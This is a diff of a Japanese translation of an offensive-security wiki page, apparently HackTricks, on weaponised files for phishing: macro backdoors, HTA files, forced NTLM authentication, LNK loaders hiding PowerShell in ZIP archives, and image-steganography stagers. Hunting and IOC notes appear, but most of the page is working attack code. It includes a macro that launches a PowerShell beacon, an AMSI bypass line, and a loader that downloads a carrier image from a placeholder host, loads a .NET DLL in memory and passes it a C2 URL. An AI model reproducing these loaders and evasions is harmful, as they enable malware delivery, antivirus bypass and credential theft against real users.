@@ -4,13 +4,13 @@
 
 ## Office ドキュメント
 
-Microsoft Word はファイルを開く前にファイルのデータ検証を行います。データ検証は OfficeOpenXML 標準に対するデータ構造の識別の形で行われます。データ構造の識別中にエラーが発生した場合、解析対象のファイルは開かれません。
+Microsoft Word はファイルを開く前にファイルのデータ検証を行います。データ検証は OfficeOpenXML 標準に基づくデータ構造の識別という形で行われます。データ構造の識別中にエラーが発生した場合、解析対象のファイルは開かれません。
 
-通常、マクロを含む Word ファイルは `.docm` 拡張子を使用します。しかし、ファイル拡張子を変更してファイル名を変更しても、マクロ実行機能を維持することが可能です。\
-例えば、RTF ファイルは設計上マクロをサポートしませんが、DOCM ファイルを RTF にリネームすると Microsoft Word によって処理され、マクロ実行が可能になります。\
-同じ内部構造と仕組みは Microsoft Office Suite（Excel, PowerPoint 等）の全ソフトウェアに適用されます。
+通常、macros を含む Word ファイルは `.docm` 拡張子を使用します。しかし、拡張子を変更してファイル名を変更しても、macro 実行機能を維持することが可能です。\
+例えば、RTF ファイルは設計上 macros をサポートしませんが、DOCM ファイルを RTF にリネームすると Microsoft Word がそれを処理し、macro を実行できるようになります。\
+同じ内部構造とメカニズムは Microsoft Office Suite（Excel、PowerPoint など）の全てのソフトウェアにも当てはまります。
 
-以下のコマンドを使用して、いくつかの Office プログラムで実行される拡張子を確認できます:
+以下のコマンドで、いくつかの Office プログラムが実行する拡張子を確認できます:
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
@@ -18,18 +18,18 @@ DOCX files referencing a remote template (File –Options –Add-ins –Manage: 
 
 ### 外部画像の読み込み
 
-Go to: _Insert --> Quick Parts --> Field_\
-_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever
+以下を選択: _Insert --> Quick Parts --> Field_\
+_**カテゴリ**: Links and References、**フィールド名**: includePicture、**ファイル名またはURL**:_ http://<ip>/whatever
 
 ![](<../../images/image (155).png>)
 
-### マクロによるバックドア
+### マクロのバックドア
 
-マクロを利用して、ドキュメントから任意コードを実行することが可能です。
+マクロを使ってドキュメントから任意のコードを実行することが可能である。
 
-#### オートロード関数
+#### 自動実行関数
 
-一般的であればあるほど、AVが検知する可能性が高くなります。
+それらが一般的であればあるほど、AVに検知される可能性が高くなる。
 
 - AutoOpen()
 - Document_Open()
@@ -64,16 +64,16 @@ Dim proc As Object
 Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
 proc.Create "powershell <beacon line generated>
 ```
-#### 手動でメタデータを削除する
+#### メタデータを手動で削除
 
-ファイルメニューから **File > Info > Inspect Document > Inspect Document** を開くと、Document Inspector が表示されます。**Inspect** をクリックし、次に **Document Properties and Personal Information** の横にある **Remove All** をクリックします。
+**File > Info > Inspect Document > Inspect Document** に移動すると Document Inspector が表示されます。**Inspect** をクリックし、**Document Properties and Personal Information** の横にある **Remove All** をクリックします。
 
-#### Doc 拡張子
+#### Doc Extension
 
-終了したら、**Save as type** ドロップダウンを選択し、形式を **`.docx`** から **Word 97-2003 `.doc`** に変更します。\
-これは、**`.docx` 内にマクロを保存できない**ためと、マクロ有効な **`.docm`** 拡張子に対する **偏見**（例：サムネイルアイコンに大きな `!` が表示され、一部の web/email gateway がそれらを完全にブロックする） があるためです。したがって、この **レガシーな `.doc` 拡張子が最良の妥協案** です。
+作業が終わったら、**Save as type** ドロップダウンを選択し、形式を **`.docx`** から **Word 97-2003 `.doc`** に変更します。\
+これは **`.docx`** の内部に macro を保存できないためで、macro 有効な **`.docm`** 拡張子には忌避感（例: サムネイルアイコンに大きな `!` が表示され、一部の web/email ゲートウェイで完全にブロックされる）があります。したがって、このレガシーな **`.doc`** 拡張子が最良の妥協点です。
 
-#### Malicious Macros Generators
+#### 悪意のあるマクロ生成ツール
 
 - MacOS
 - [**macphish**](https://github.com/cldrn/macphish)
@@ -81,9 +81,9 @@ proc.Create "powershell <beacon line generated>
 
 ## HTA Files
 
-An HTA は、HTML とスクリプト言語（VBScript や JScript など）を組み合わせた Windows プログラムです。ユーザーインターフェイスを生成し、ブラウザのセキュリティモデルの制約を受けない「fully trusted」アプリケーションとして実行されます。
+HTA は、HTML とスクリプト言語（例: **VBScript** や **JScript**）を組み合わせた Windows プログラムです。ユーザーインターフェースを生成し、ブラウザのセキュリティモデルの制約を受けない「完全に信頼された」アプリケーションとして実行されます。
 
-An HTA は **`mshta.exe`** を使用して実行され、通常は **Internet Explorer** とともに **インストール** されるため、**`mshta` は IE に依存** します。したがって、IE がアンインストールされていると、HTA は実行できなくなります。
+HTA は **`mshta.exe`** を使って実行され、通常は **installed** とともに **Internet Explorer** によって提供されます。これにより **`mshta` dependant on IE** となるため、IE がアンインストールされている場合、HTA は実行できません。
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -138,11 +138,11 @@ var_func
 self.close
 </script>
 ```
-## NTLM 認証を "リモートで" 強制する
+## NTLM 認証の強制
 
-**NTLM 認証を "リモートで" 強制する**方法はいくつかあります。たとえば、ユーザがアクセスするメールや HTML に **不可視画像** を追加する（HTTP MitM?）ことや、フォルダを開くだけで **認証** を **誘発する**ような **ファイルのアドレス** を被害者に送ることが考えられます。
+NTLM 認証を**「リモートで」強制する**方法はいくつかあります。例えば、ユーザがアクセスするメールや HTML に**不可視の画像**を追加する（HTTP MitM を使うこともあり得ます）。あるいは被害者に、フォルダを**開くだけで**認証を**トリガーする**ような**ファイルのアドレス**を送る、などです。
 
-**これらのアイデアやその他の詳細は以下のページを参照してください：**
+**以下のページでこれらのアイデアやその他を確認してください：**
 
 
 {{#ref}}
@@ -156,24 +156,24 @@ self.close
 
 ### NTLM Relay
 
-ハッシュや認証を盗むだけでなく、**NTLM Relay attacks** を実行することもできます：
+ハッシュや認証情報を盗むだけでなく、**NTLM relay attacks** を実行できる点を忘れないでください：
 
 - [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
 - [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
 ## LNK Loaders + ZIP-Embedded Payloads (fileless chain)
 
-非常に効果的なキャンペーンでは、2つの正規のデコイ文書（PDF/DOCX）と悪意のある .lnk を含む ZIP を配布します。トリックは、実際の PowerShell ローダーが ZIP の生バイト内の固有のマーカーの後に格納されており、.lnk がそれをメモリ上で切り出して実行する点です。
+非常に効果的なキャンペーンでは、2つの正規のデコイドキュメント（PDF/DOCX）と悪意のある .lnk を含む ZIP を配布します。トリックは、実際の PowerShell ローダーが ZIP の生バイト列の中にユニークなマーカーの後ろに格納されており、.lnk がそれを切り出して完全にメモリ上で実行することです。
 
-.lnk の PowerShell ワンライナーで実装される典型的なフロー：
+典型的に .lnk の PowerShell ワンライナーで実装されるフロー：
 
-1) Desktop、Downloads、Documents、%TEMP%、%ProgramData%、およびカレントワーキングディレクトリの親などの一般的なパスで元の ZIP を探す。  
-2) ZIP のバイトを読み、ハードコードされたマーカー（例: xFIQCV）を探す。マーカー以降のすべてが埋め込まれた PowerShell ペイロードである。  
-3) ZIP を %ProgramData% にコピーしてそこで展開し、デコイの .docx を開いて正規のように見せる。  
+1) Desktop, Downloads, Documents, %TEMP%, %ProgramData% およびカレントワーキングディレクトリの親など、一般的なパスで元の ZIP を検索する。  
+2) ZIP のバイトを読み、ハードコードされたマーカー（例: xFIQCV）を見つける。マーカー以降のすべてが埋め込まれた PowerShell ペイロードである。  
+3) ZIP を %ProgramData% にコピーし、そこに展開してデコイの .docx を開き、正規に見せかける。  
 4) 現在のプロセスで AMSI をバイパスする: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
-5) 次のステージをデオブフスク（例: すべての # 文字を削除）して、メモリ上で実行する。
+5) 次段（例: すべての # 文字を削除するなど）をデオブフスクしてメモリ内で実行する。
 
-埋め込まれたステージを切り出して実行する PowerShell スケルトンの例：
+組み込みステージを切り出して実行するための PowerShell スケルトン例：
 ```powershell
 $marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
 $paths    = @(
@@ -190,24 +190,90 @@ $code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 Invoke-Expression $code
 ```
-注意
-- Delivery often abuses reputable PaaS subdomains (e.g., *.herokuapp.com) and may gate payloads (serve benign ZIPs based on IP/UA).
-- 次段階では、base64/XORで暗号化されたshellcodeを復号し、Reflection.Emit + VirtualAlloc経由で実行してディスク痕跡を最小化することが多い。
+注記
+- 配信は信頼された PaaS サブドメイン（例: *.herokuapp.com）を悪用することが多く、payloads を条件付きで配信する（IP/UA に基づき無害な ZIPs を返す）ことがある。
+- 次のステージでは、base64/XOR shellcode を復号し、Reflection.Emit + VirtualAlloc 経由で実行してディスク痕跡を最小化することが多い。
 
 Persistence used in the same chain
-- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:
+- COM TypeLib hijacking による Microsoft Web Browser control の悪用 — IE/Explorer やそれを埋め込むアプリが payload を自動的に再起動するようにする。詳細と即使用可能なコマンドは以下参照:
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
 {{#endref}}
 
 Hunting/IOCs
-- アーカイブデータの末尾にASCIIマーカー文字列（例: xFIQCV）が追加されたZIPファイル。
-- .lnk が親/ユーザーフォルダを列挙してZIPを探し、デコイドキュメントを開く。
-- AMSIの改ざん（[System.Management.Automation.AmsiUtils]::amsiInitFailed を使用）。
-- 長時間稼働するビジネススレッドが、信頼されたPaaSドメインでホストされたリンクで終わる。
+- ZIP files に、アーカイブデータの末尾に追記された ASCII マーカー文字列（例: xFIQCV）が含まれる。
+- .lnk が親/ユーザフォルダを列挙して ZIP を探し、decoy document を開く。
+- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
+- 長時間稼働するビジネススレッドが信頼された PaaS ドメインでホストされたリンクで終わる。
 
-## Windows files to steal NTLM hashes
+## 画像内の Steganography-delimited payloads (PowerShell stager)
+
+最近の loader chains は難読化された JavaScript/VBS を配信し、それが Base64 PowerShell stager をデコードして実行する。  
+その stager は画像（多くは GIF）をダウンロードし、一意の start/end markers の間にプレーンテキストとして隠された Base64-encoded .NET DLL を含む。スクリプトはこれらのデリミタ（実際に確認された例: «<<sudo_png>> … <<sudo_odt>>>»）を検索し、間のテキストを抽出して Base64 デコードしてバイト化し、アセンブリをメモリ上にロードして既知のエントリーメソッドを C2 URL と共に呼び出す。
+
+ワークフロー
+- Stage 1: Archived JS/VBS dropper → 埋め込まれた Base64 をデコード → PowerShell stager を -nop -w hidden -ep bypass で起動。
+- Stage 2: PowerShell stager → 画像をダウンロードし、marker-delimited Base64 を切り出して .NET DLL をメモリ上にロードし、そのメソッド（例: VAI）を C2 URL とオプションを渡して呼び出す。
+- Stage 3: Loader は最終 payload を取得し、通常は process hollowing で信頼されたバイナリ（一般的には MSBuild.exe）に注入する。process hollowing と trusted utility proxy execution の詳細は以下参照:
+
+{{#ref}}
+../../reversing/common-api-used-in-malware.md
+{{#endref}}
+
+PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:
+
+<details>
+<summary>PowerShell stego payload extractor and loader</summary>
+```powershell
+# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
+param(
+[string]$Url    = 'https://example.com/payload.gif',
+[string]$StartM = '<<sudo_png>>',
+[string]$EndM   = '<<sudo_odt>>',
+[string]$EntryType = 'Loader',
+[string]$EntryMeth = 'VAI',
+[string]$C2    = 'https://c2.example/payload'
+)
+$img = (New-Object Net.WebClient).DownloadString($Url)
+$start = $img.IndexOf($StartM)
+$end   = $img.IndexOf($EndM)
+if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
+$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
+$bytes = [Convert]::FromBase64String($b64)
+$asm = [Reflection.Assembly]::Load($bytes)
+$type = $asm.GetType($EntryType)
+$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
+$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
+```
+</details>
+
+ノート
+- これは ATT&CK T1027.003 (steganography/marker-hiding) に該当します。マーカーはキャンペーンごとに異なります。
+- AMSI/ETW のバイパスや文字列のデオブフスケーションは、アセンブリをロードする前に一般的に適用されます。
+- ハンティング: ダウンロードされた画像を既知のデリミタでスキャンする；画像にアクセスして即座に Base64 ブロブをデコードする PowerShell を特定する。
+
+See also stego tools and carving techniques:
+
+{{#ref}}
+../../crypto-and-stego/stego-tricks.md
+{{#endref}}
+
+## JS/VBS ドロッパー → Base64 PowerShell ステージング
+
+繰り返し見られる初期段階としては、アーカイブ内に格納された小さく強く難読化された `.js` または `.vbs` があり、その唯一の目的は埋め込まれた Base64 文字列をデコードし、`-nop -w hidden -ep bypass` オプションで PowerShell を起動して HTTPS 経由で次の段階をブートストラップすることです。
+
+基本的なロジック（抽象）:
+- 自身のファイル内容を読み取る
+- ジャンク文字列の間にある Base64 ブロブを見つける
+- ASCII の PowerShell スクリプトにデコードする
+- `wscript.exe`/`cscript.exe` を介して `powershell.exe` を起動して実行する
+
+ハンティングの手掛かり
+- アーカイブされた JS/VBS 添付ファイルがコマンドラインに `-enc`/`FromBase64String` を含む `powershell.exe` を生成するケース。
+- ユーザの temp パスから `wscript.exe` が `powershell.exe -nop -w hidden` を起動するケース。
+
+## Windows から NTLM ハッシュを盗むファイル
 
 以下のページを確認してください: **places to steal NTLM creds**:
 
@@ -220,5 +286,9 @@ Hunting/IOCs
 
 - [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
 - [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
+- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
+- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
+- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
+- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
 
 {{#include ../../banners/hacktricks-training.md}}
